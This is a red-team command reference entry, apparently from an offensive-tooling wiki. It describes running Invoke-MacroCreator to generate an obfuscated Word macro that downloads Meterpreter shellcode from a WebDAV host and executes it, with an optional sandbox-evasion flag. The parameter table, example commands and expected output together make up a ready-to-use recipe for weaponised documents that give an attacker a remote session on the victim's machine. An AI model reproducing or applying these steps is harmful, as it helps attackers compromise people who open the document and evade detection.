---
type: command
executor: powershell
data: >-
  Invoke-MacroCreator -i $_INPUT_FILE -t shellcode -url $_WEBDAV_URL -d webdav
  -o
tags:
  - macro
  - shellcode
  - webdav
  - covert-channel
platforms:
  - Windows
verified: true
validated: true
---

# invoke-macrocreator-deliver-shellcode-via-webdav

## Command

```powershell
Invoke-MacroCreator -i $_INPUT_FILE -t shellcode -url $_WEBDAV_URL -d webdav -o
```

## Description

This command generates a Word macro that fetches Meterpreter shellcode from a WebDAV server at runtime, using obfuscation to hide URLs and logic. The macro downloads the payload via WebClient or similar COM objects when enabled, evading static analysis by keeping the document small. Suitable for network-restricted environments where direct embedding is undesirable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -i $_INPUT_FILE | Path to the raw shellcode file for reference (tool may upload it) | Yes |
| -t shellcode | Specifies the payload type as shellcode | Yes |
| -url $_WEBDAV_URL | URL of the WebDAV server hosting the shellcode (e.g., http://webdavserver.com/payload.raw) | Yes |
| -d webdav | Delivery method: WebDAV covert channel | Yes |
| -o | Enable VBA code obfuscation | Yes (in this invocation) |
| -e | Enable sandbox evasion (optional) | No |

## Examples

### Basic Usage

```powershell
Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url http://webdavserver.com -d webdav -o
```

### With Evasion

```powershell
Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url http://webdavserver.com -d webdav -o -e
```

## Expected Output

Outputs a .docm file (e.g., 'webdav_macro.docm'). Console: 'WebDAV macro created: webdav_macro.docm'. When opened and macros enabled, the VBA code contacts the WebDAV URL, downloads/decodes the shellcode, and executes it, resulting in a Meterpreter callback.

## Related

- [[procedures/Macro-Delivery-of-Meterpreter-Shellcode]]
- [[tools/Invoke-MacroCreator]]
